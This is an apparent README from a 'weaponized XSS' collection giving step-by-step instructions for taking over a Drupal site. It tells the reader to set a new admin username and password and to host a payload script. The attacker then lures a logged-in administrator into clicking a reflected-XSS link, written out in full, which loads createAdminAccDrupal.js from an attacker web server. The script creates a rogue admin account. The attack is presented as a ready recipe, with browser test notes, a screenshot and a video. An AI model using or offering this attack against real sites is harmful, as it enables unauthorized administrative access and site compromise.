# [authn] Create New Admin User (ATO)

## Test Environment

### Web Browsers (20250426)

* [x] Mozilla Firefox 137.0.2 (64-bit)
* [x] Google Chrome 135.0.7049.115 (64-bit)
* [x] Microsoft Edge 135.0.3179.98 (64-bit)

## Exploitation Steps

1. [setup exploit] change payload variable values (`createAdminAccDrupal.js`)

    `newAccUser` - username of the user account to be created

    `newAccPass` - password of the user account to be created (**NOTE**: no password requirements)

    `drupalRoot` - path to Drupal installation on the target system (e.g. `"/drupal"`)

2. [setup exploit] setup web server (to serve the payload)

3. [social engineering attack] victim user (with administrative privileges) logs in

    http://192.168.5.17/user/login

4. [social engineering attack] victim user clicks link

    ```
    http://192.168.5.17/rxss.php?q=<script src=http://192.168.5.5/createAdminAccDrupal.js></script>
    ```

    * **NOTES**:
      * `192.168.5.17` - target Drupal site
      * `192.168.5.5` - web server hosting the payload

5. [post exploit] attacker logs into target Drupal site using specified credentials

    http://192.168.5.17/user/login

## Screenshot

* **NOTE**: the screenshot covers steps 1 to 4 from the "Exploitation Steps" chapter

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/Drupal/CreateNewAdmin/screenshots/Drupal_-_create_new_admin_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/Drupal/CreateNewAdmin/screenshots/Drupal_-_create_new_admin_-_1-1.png">
    </picture>
  </kbd>
</p>

## Video

https://github.com/user-attachments/assets/f6c8aaa9-6cc4-42e4-a224-6bdf9d5be35e
